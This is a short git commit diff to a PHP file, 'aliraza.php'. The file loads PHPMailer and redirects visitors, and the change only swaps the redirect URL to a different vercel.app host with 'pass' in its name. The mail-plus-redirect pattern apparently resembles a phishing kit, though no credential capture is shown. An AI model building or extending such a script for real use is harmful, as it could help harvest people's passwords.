0c3162db2f8fca81189710520b6dcadf8f9835f1
contentemmaronnie <content.emmaronnie.ads@gmail.com>
2025-07-10 01:55:24 +0500

    Update aliraza.php

--- aliraza.php
+++ aliraza.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://dadanpass-huopas-projects.vercel.app/");
+header("Location: https://alirazapass.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
